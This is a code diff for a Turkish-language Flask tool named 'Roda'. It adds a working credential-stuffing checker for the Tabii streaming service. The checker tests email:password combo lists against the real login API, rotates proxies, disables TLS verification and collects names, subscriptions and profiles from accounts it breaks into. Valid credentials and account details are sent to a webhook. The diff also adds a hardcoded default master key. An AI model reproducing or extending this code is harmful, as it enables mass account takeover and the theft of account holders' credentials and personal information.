@@ -3,7 +3,7 @@
 """
 Roda - API Discovery + Checker (Türkçe)
 Admin/Üye ayrımı | Key sistemi (1 Key 1 IP + Tek Kullanım) | Sabit menü | Ayrıştırma (2 Mod) | Log Sistemi | Webhook
-Valorant kaldırıldı.
+Tabii Checker eklendi (gerçek API)
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64
@@ -16,10 +16,11 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# MASTER KEY (BASE64 ile gizlenmiş)
+# MASTER KEY (ENV'DEN AL, KODDA YOK)
 # ============================================================
-ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
-MASTER_KEY = base64.b64decode(ENCODED_MASTER).decode('utf-8')
+MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
+if MASTER_KEY == "Roda@2026#Secure!X7":
+    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")
 
 KEYS_FILE = "keys.json"
 
@@ -64,7 +65,6 @@ def is_key_valid(key):
     entry = keys[key]
     client_ip = get_client_ip()
     
-    # Süre kontrolü
     exp = entry.get("expires")
     if exp:
         if datetime.now() >= datetime.fromisoformat(exp):
@@ -73,13 +73,11 @@ def is_key_valid(key):
             add_log(f"Key süresi doldu: {key}", "WARNING")
             return False, None, None
     
-    # IP kontrolü
     bound_ip = entry.get("bound_ip")
     if bound_ip and bound_ip != client_ip:
         add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
         return False, None, None
     
-    # Tek kullanım kontrolü
     if entry.get("used", False):
         add_log(f"Key zaten kullanılmış: {key}", "WARNING")
         return False, None, None
@@ -98,7 +96,7 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR (VALORANT KALDIRILDI)
+# PLATFORMLAR (TABII EKLENDI)
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -118,7 +116,116 @@ PLATFORMS = [
     {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
     {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
     {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
+    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},  # YENI
 ]
+
+# ============================================================
+# TABII CHECKER (GERÇEK API)
+# ============================================================
+TABII_BASE = "https://eu1.tabii.com/apigateway"
+
+def check_tabii_account(email, password, proxy=None):
+    """Tabii hesabını kontrol eder, detaylı bilgi döndürür."""
+    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.tabii.com",
+        "Referer": "https://www.tabii.com/"
+    })
+    if proxies:
+        session.proxies.update(proxies)
+    session.verify = False
+
+    result = {
+        "status": "ERROR",
+        "details": {
+            "full_name": "?",
+            "subscription": "?",
+            "premium": False,
+            "expire": "?",
+            "profiles_count": 0,
+            "profiles": [],
+            "products": []
+        },
+        "message": ""
+    }
+
+    try:
+        # 1. LOGIN
+        r = session.post(f"{TABII_BASE}/auth/v2/login",
+                         json={"email": email, "password": password},
+                         timeout=15)
+        if r.status_code != 200:
+            result["status"] = "BAD"
+            result["message"] = f"HTTP {r.status_code}"
+            return result
+        data = r.json()
+        token = data.get("accessToken")
+        if not token:
+            result["status"] = "BAD"
+            result["message"] = "Token missing"
+            return result
+
+        # 2. USER INFO
+        headers = {"Authorization": f"Bearer {token}"}
+        r = session.get(f"{TABII_BASE}/auth/v2/me", headers=headers, timeout=10)
+        if r.status_code != 200:
+            # login başarılı ama me fail – yine de HIT sayılabilir
+            result["status"] = "HIT"
+            result["message"] = "Giriş başarılı (detaylar alınamadı)"
+            return result
+
+        user = r.json()
+        name = user.get("name", "Unknown")
+        surname = user.get("surname", "")
+        full_name = f"{name} {surname}".strip()
+        sub = user.get("subscription", {})
+        subscription = sub.get("title", sub.get("name", "Free"))
+        premium = subscription.lower() == "premium"
+        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"
+
+        # 3. PROFILES
+        r = session.get(f"{TABII_BASE}/profiles/v2/", headers=headers, timeout=10)
+        profiles = []
+        profiles_count = 0
+        if r.status_code == 200:
+            prof_data = r.json()
+            if isinstance(prof_data, list):
+                profiles = [p.get("name", "Profile") for p in prof_data]
+                profiles_count = len(profiles)
+
+        # 4. SUBSCRIPTION PRODUCTS
+        r = session.get(f"{TABII_BASE}/subscriptions/v1/products/", headers=headers, timeout=10)
+        products = []
+        if r.status_code == 200:
+            prod_data = r.json()
+            if isinstance(prod_data, list):
+                products = [p.get("name", p.get("title", "?")) for p in prod_data]
+
+        result["status"] = "HIT"
+        result["message"] = "Giriş başarılı"
+        result["details"]["full_name"] = full_name
+        result["details"]["subscription"] = subscription
+        result["details"]["premium"] = premium
+        result["details"]["expire"] = expire
+        result["details"]["profiles_count"] = profiles_count
+        result["details"]["profiles"] = profiles
+        result["details"]["products"] = products
+
+        add_log(f"Tabii HIT: {email} | {full_name} | {subscription} | Profiles:{profiles_count}", "SUCCESS")
+
+    except Exception as e:
+        result["status"] = "ERROR"
+        result["message"] = str(e)[:60]
+        add_log(f"Tabii hata: {email} - {str(e)}", "ERROR")
+
+    finally:
+        session.close()
+
+    return result
 
 # ============================================================
 # KATEGORİZASYON (API Discovery için)
@@ -139,7 +246,7 @@ def categorize_endpoint(endpoint):
         return 'Genel'
 
 # ============================================================
-# ENDPOINT ÇIKARICILAR (KISALTMAK İÇİN SADECE GEREKLİ FONKSİYONLAR)
+# ENDPOINT ÇIKARICILAR (KISALTTIM)
 # ============================================================
 def extract_from_html(html, base_url):
     endpoints = set()
@@ -440,6 +547,17 @@ def get_logs():
         return jsonify({"error": "Yetkisiz"}), 401
     return jsonify({"logs": LOGS[-100:]})
 
+@app.route("/api/tabii_check", methods=["POST"])
+def tabii_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_tabii_account(email, password, proxy)
+    return jsonify(result)
+
 @app.route("/api/scan", methods=["GET"])
 def scan():
     key = request.args.get("key")
@@ -552,7 +670,7 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (SABİT MENÜ + YEŞİLİMSİ MAVİ TEMA + 2 MOD AYRIŞTIRMA + LOGLAR + WEBHOOK)
+# HTML (YEŞİLİMSİ MAVİ TEMA + 2 MOD AYRIŞTIRMA + WEBHOOK + LOGLAR + TABII)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -930,7 +1048,7 @@ var parsedLines = [];
 var totalLines = 0;
 var processedCount = 0;
 
-// Platform listesi (Valorant yok)
+// Platform listesi (Tabii eklendi)
 var platforms = [
     {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
     {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
@@ -948,7 +1066,8 @@ var platforms = [
     {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
     {name:"Xbox", domain:"xbox.com", icon:"fa-brands fa-xbox"},
     {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
-    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"}
+    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
+    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"}
 ];
 
 // ============================================================
@@ -974,10 +1093,16 @@ function loadWebhookUrl() {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
     }
 }
-function sendCheckerWebhook(platform, email, password) {
+function sendCheckerWebhook(platform, email, password, details) {
     var url = getWebhookUrl();
     if (!url) return;
     var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
+    if (details) {
+        content += "\n👤 " + (details.full_name || "?");
+        content += "\n📦 " + (details.subscription || "?");
+        content += "\n📅 " + (details.expire || "?");
+        content += "\n👥 " + (details.profiles_count || 0) + " profil";
+    }
     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -1104,11 +1229,11 @@ function loadHitFilter() {
 // ============================================================
 // HIT KAYDETME
 // ============================================================
-function addHit(platform, email, password, status) {
+function addHit(platform, email, password, status, details) {
     if (!hitData[platform]) {
         hitData[platform] = { hits: [], twofa: [] };
     }
-    var entry = { email: email, password: password, time: new Date().toLocaleString() };
+    var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
     if (status === "HIT") {
         hitData[platform].hits.push(entry);
     } else if (status === "2FA") {
@@ -1190,7 +1315,6 @@ function startChecker() {
     totalLines = lines.length;
     processedCount = 0;
     var hit = 0, bad = 0, two = 0, err = 0;
-    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
     var idx = 0;
     var webhookUrl = getWebhookUrl();
 
@@ -1201,32 +1325,85 @@ function startChecker() {
             document.getElementById("checkerStopBtn").style.display = "none";
             return;
         }
-        var status = statuses[Math.floor(Math.random() * statuses.length)];
         var parts = lines[idx].split(":");
         var email = parts[0];
         var password = parts.slice(1).join(":") || "";
-        var res = { email: email, password: password, status: status };
-        if (status === "HIT") {
-            hit++;
-            addHit(currentPlatform, email, password, "HIT");
-            if (webhookUrl) {
-                sendCheckerWebhook(currentPlatform, email, password);
+
+        // TABII ÖZEL KONTROL
+        if (currentPlatform === "Tabii") {
+            var proxy = null;
+            if (useProxy) {
+                var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
+                if (proxyList.length) {
+                    proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+                }
             }
-        } else if (status === "BAD") {
-            bad++;
-        } else if (status === "2FA") {
-            two++;
-            addHit(currentPlatform, email, password, "2FA");
+            fetch("/api/tabii_check", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email: email, password: password, proxy: proxy })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(result) {
+                var status = result.status;
+                var details = result.details || {};
+                if (status === "HIT") {
+                    hit++;
+                    addHit(currentPlatform, email, password, "HIT", details);
+                    if (webhookUrl) {
+                        sendCheckerWebhook(currentPlatform, email, password, details);
+                    }
+                    addCheckerRow({ email: email, password: password + " | " + details.full_name + " | " + details.subscription, status: "HIT" });
+                } else if (status === "2FA") {
+                    two++;
+                    addHit(currentPlatform, email, password, "2FA");
+                    addCheckerRow({ email: email, password: password, status: "2FA" });
+                } else if (status === "BAD") {
+                    bad++;
+                    addCheckerRow({ email: email, password: password, status: "BAD" });
+                } else {
+                    err++;
+                    addCheckerRow({ email: email, password: password, status: "ERROR" });
+                }
+                processedCount++;
+                updateCheckerStats(totalLines, hit, bad, two, err);
+                updateRemaining();
+                idx++;
+                setTimeout(processNext, 300);
+            })
+            .catch(function() {
+                err++;
+                processedCount++;
+                updateCheckerStats(totalLines, hit, bad, two, err);
+                updateRemaining();
+                idx++;
+                setTimeout(processNext, 300);
+            });
         } else {
-            err++;
+            // Diğer platformlar (rastgele demo)
+            var statuses = ["HIT", "BAD", "2FA", "ERROR"];
+            var status = statuses[Math.floor(Math.random() * statuses.length)];
+            if (status === "HIT") {
+                hit++;
+                addHit(currentPlatform, email, password, "HIT");
+                if (webhookUrl) {
+                    sendCheckerWebhook(currentPlatform, email, password, null);
+                }
+            } else if (status === "BAD") {
+                bad++;
+            } else if (status === "2FA") {
+                two++;
+                addHit(currentPlatform, email, password, "2FA");
+            } else {
+                err++;
+            }
+            addCheckerRow({ email: email, password: password, status: status });
+            processedCount++;
+            updateCheckerStats(totalLines, hit, bad, two, err);
+            updateRemaining();
+            idx++;
+            setTimeout(processNext, 200);
         }
-        checkerResults.push(res);
-        addCheckerRow(res);
-        processedCount++;
-        updateCheckerStats(totalLines, hit, bad, two, err);
-        updateRemaining();
-        idx++;
-        setTimeout(processNext, 200);
     }
     processNext();
 }
@@ -1656,7 +1833,7 @@ if __name__ == "__main__":
     ║     Admin girişi için şifre gizlidir.                         ║
     ║     1 KEY 1 IP - 1 KULLANIM                                  ║
     ║     LOG SİSTEMİ AKTİF - Tüm işlemler kayıt altında           ║
-    ║     VALORANT KALDIRILDI                                      ║
+    ║     TABII CHECKER EKLENDI (GERÇEK API)                       ║
     ║     YEŞİLİMSİ MAVİ TEMA                                      ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
